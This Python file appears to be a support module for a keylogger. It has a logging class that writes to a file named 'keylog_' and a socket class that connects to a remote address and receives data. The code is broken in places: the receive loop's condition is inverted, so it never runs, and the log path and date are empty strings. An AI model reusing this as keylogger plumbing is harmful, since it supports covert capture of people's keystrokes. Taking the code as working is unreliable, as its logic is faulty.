import logging
import socket


class logger:
    def __init__(self):
        log_dir = ""
        datetime = ""
        logging.basicConfig(filename=f"{log_dir}\\keylog_{datetime}",
                            level=logging.DEBUG,
                            format='%(message)s')

    def write(self, msg):
        logging.info(msg)



class network:
    count = 0
    def __init__(self,addr:tuple):
        self.sockfd=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sockfd.connect(addr)

    def recv(self):
        data = ""
        while data == b"/close":
            data = self.sockfd.recv(4096)
            if not data :
                break
            self.count += len(data)
            print(f"\nI get data:\n{repr(data)}")



    def close(self):
        print(f"I totally got {self.count} bytes data")
        self.sockfd.shutdown(socket.SHUT_RDWR)
        self.sockfd.close()
